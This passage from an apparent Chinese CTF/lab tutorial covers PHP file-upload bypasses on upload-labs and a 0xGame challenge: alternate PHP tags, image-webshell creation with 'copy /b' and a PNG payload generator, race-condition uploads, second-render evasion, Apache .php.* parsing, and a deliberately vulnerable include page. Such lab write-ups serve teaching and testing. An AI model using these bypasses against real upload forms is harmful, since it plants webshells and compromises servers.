<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<p>拼接后的名字为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload-20.php + &quot;.&quot; + save_name[1]的数据</span><br></pre></td></tr></table></figure>

<p>由于<code> save_name[1]</code> 为 NULL ，结果为 <code>upload-20.php.</code></p>
<p>那么就回到黑名单中的点绕过了</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6c4b543e833710bd0c7e62e4c8c2fb20.png" alt="image-20240508111840210"><br>注意：抓包后只有一个 post 上传数据，所以图中选中的数据是复制上面的 post 数据并加以更改</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b6d0961a3b9aa96b9faa267e25ee59e8.png" alt="image-20240508112152367"></p>
</li>
</ul>
<h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><h5 id="php-标签检测"><a href="#php-标签检测" class="headerlink" title="php 标签检测"></a>php 标签检测</h5><p>检测并过滤上传文件中包含的 <code>&lt;?php</code> 内容。</p>
<p>php 标签的 4 种写法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;tag&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>正常写法，可能会被过滤，这时就要采用后面的3种写法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> </span><br><span class="line">    <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;tag&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>短标签写法，<code>&lt;?=</code>就相当于<code>&lt;?php echo</code>；如果配置文件 php.ini 中 <code>short_open_tag = On</code>，则可以用<code>&lt;?</code>代替<code>&lt;?php</code>。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">     echo <span class="title function_">md5</span>(<span class="string">&#x27;tag&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>适用于 php7 以前的版本。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;tag&#x27;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>需要通过 php.ini 配置文件中的指令<code>asp_tags=On</code>打开后才可用。</p>
<h5 id="文件幻数检测"><a href="#文件幻数检测" class="headerlink" title="文件幻数检测"></a>文件幻数检测</h5><p>文件幻数（magic number），它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p>
<p>通常情况下，通过判断前10个字节，基本就能判断出一个文件的真实类型。</p>
<p>绕过方式（制作图片马）：</p>
<p>项目地址：<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">GitHub - huntergregal&#x2F;PNG-IDAT-Payload-Generator: Generate a PNG with a payload embedded in the IDAT chunk (Based off of previous concepts and code – credit in README)</a></p>
<p>查看帮助：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python generate.py -h </span><br></pre></td></tr></table></figure>

<p>制作图片马：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python generate.py -m php -o png.php</span><br></pre></td></tr></table></figure>

<p>基本使用方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: generate.py [-h] [-q] -m &#123;xss,php&#125; [-r REMOTE_DOMAIN] -o OUTPUT_IMAGE [-u UPDATE] [-p PAYLOAD] [-t THREADS]</span><br><span class="line"></span><br><span class="line">Tool to generate PNG-IDAT Payloads.</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -q, --quiet           Optional: quiet mode</span><br><span class="line">  -m &#123;xss,php&#125;, --method &#123;xss,php&#125;</span><br><span class="line">                        Choose payload method, -h to view available methods</span><br><span class="line">  -r REMOTE_DOMAIN, --remote-domain REMOTE_DOMAIN</span><br><span class="line">                        Remote domain to retrieve payload from (shorter the better: ex. xx.xxx. use xqi.cc for generic XSS)</span><br><span class="line">  -o OUTPUT_IMAGE, --output-file OUTPUT_IMAGE</span><br><span class="line">                        Output payload to PNG file</span><br><span class="line">  -u UPDATE, --update UPDATE</span><br><span class="line">                        Update the payload tables</span><br><span class="line">  -p PAYLOAD, --payload PAYLOAD</span><br><span class="line">                        Use the provided payload - no bruteforce</span><br><span class="line">  -t THREADS, --threads THREADS</span><br><span class="line">                        Number of threads to use for bruteforce</span><br></pre></td></tr></table></figure>

<p>也可以通过命令制作简单的图片马，看下面例子</p>
<p>实例：</p>
<p>upload-labs Pass-13：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f3b1fab1f2418ecfb58f22818098c50f.png" alt="image-20240508165852295"></p>
<p>该代码会验证上传内容，确认是图片格式，所以不能简单把 php 转化为 jpg，此时就需要使用图片木马</p>
<p>我们的做法是在正常图片里面加入恶意代码</p>
<p>执行以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> image.png /b + webshell.php /a webshell.png</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/2607df00521cf71312de3832844b2666.png" alt="image-20240508170347678"></p>
<p>成功上传！点击 <strong>文件包含漏洞</strong>，进入文件包含页面：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/61f6b95d8483b5ba205bdc9e5b037b64.png" alt="image-20240508170522191"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>以 get 方式传入上传的图片木马，使其文件包含</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/19272e730c19a0e2fcdc01e40a8231af.png" alt="image-20240508170714169"></p>
<h5 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h5><p>就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到特殊的数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。</p>
<p>绕过方式：</p>
<p>先上传一张图片，再重新将图片下载下来做比较，然后在相同的地方插入 webshell，然后重新上传，配合文件包含漏洞执行 webshell。</p>
<p>实例：</p>
<p>0xGame 2023 WEB [Week 2] ez_upload</p>
<p>先上传一张 gif 图片（ gif 二次渲染最方便）</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/1f128c631cd43df99a77a1df746f9cbf.png" alt="image-20231030212159687"></p>
<p>访问后将上传的文件下载到桌面</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e6f911f2ac329b9d78fca9ab6eb05ef6.png" alt="image-20231030212337199"></p>
<p>将两张图片用 010 Editor 打开，蓝色部分为二次渲染前后不变的部分，我们要将 shell 替换同数量的字符（尽量将 shell 写在图片中间）</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5f4a42f151720fc13dd6ac32b62a05b2.png" alt="image-20231030212459609"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6b7d7d6b6d5cf8568a2ac3ad74271e0f.png" alt="image-20231030215903623"></p>
<p>打开 Burp Suite 抓包，将文件后缀改为 php，那么就会执行 shell</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9a2e4e4e2ce86a2312225fe113da4d77.png" alt="image-20231030220105765"></p>
<p>访问传入的 shell，发现执行成功</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6fe3ded24f6c57d9eb1ec238259dfed1.png" alt="image-20231030215946613"></p>
<p>最终连蚁剑得 flag</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e2f1ff930c1522b13c6a57e6a35a59e4.png" alt="image-20231030215743211"></p>
<h3 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h3><h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p>实例：</p>
<p>upload-labs Pass-18：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从源码来看，服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是 jpg、png、gif 中的一种，就将文件进行重命名。如果不符合的话，<code>unlink()</code> 函数就会删除该文件。</p>
<p>直接上传一句话木马的话，上传上去就被删除了，我还怎么去访问啊？</p>
<p>不慌不慌，要知道代码执行的过程是需要耗费时间的。如果我们能在上传的一句话被删除之前访问不就成了。这个也就叫做条件竞争上传绕过。</p>
<p>我们可以利用 burp 多线程发包，然后不断在浏览器访问我们的 webshell，会有一瞬间的访问成功。</p>
<p>我是这么想的：在浏览器访问我们的 webshell 实际上是发送数据包，而上传文件也是发送数据包，那么我们就可以设置两个爆破来自动化进行条件竞争<br><img src="https://img-blog.csdnimg.cn/img_convert/5d975651c08602c4ef0b3ac4fbbc2e7f.png" alt="image-20240508125639733"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/794edc71105ddc8c7c2197539186a230.png" alt="image-20240508125600855"></p>
<p>payload 改为 NULL payload</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/753dbd92c1eb63835f62d6d61bd25165.png" alt="image-20240508125823581"></p>
<p>回显 123，说明文件被成功解析！接下来想连蚁剑连蚁剑，想直接命令执行就命令执行</p>
<h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h4><p>实例：</p>
<p>upload-labs Pass-19：</p>
<p>myupload.php</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ccb966e06c2484f71adccf72df805372.png" alt="image-20240508113233558"></p>
<p>这代码一看就是白名单，只允许上传这里面的文件，所以不能传 php 等文件</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br></pre></td></tr></table></figure>

<p>文件上传之后又对其进行了重命名，不能使用文件包含的漏洞。</p>
<p>结合 apache 的解析漏洞，考虑 apache 未知扩展名解析漏洞：不管最后后缀为什么，只要是 <code>.php.*</code> 结尾，就会被 Apache 服务器解析成 php 文件！</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ffffee62f9afefc0e8701b2a11fca03c.png" alt="image-20240508113946403"></p>
<p>这里是先移动文件，再修改文件名，所以存在利用条件竞争</p>
<p>直接把上面的 payload 改改就行了：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ee260ad8d27c423e32e3d78c9e51acbe.png" alt="image-20240508130823142"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/26c0f9d851ca164840d1910a9e9de30c.png" alt="image-20240508130859177"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/da3fe35811b4f9335a7946a1f21f8a5a.png" alt="image-20240508130939627"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>文件上传</tag>
        <tag>upload -labs</tag>
      </tags>
  </entry>
</search>
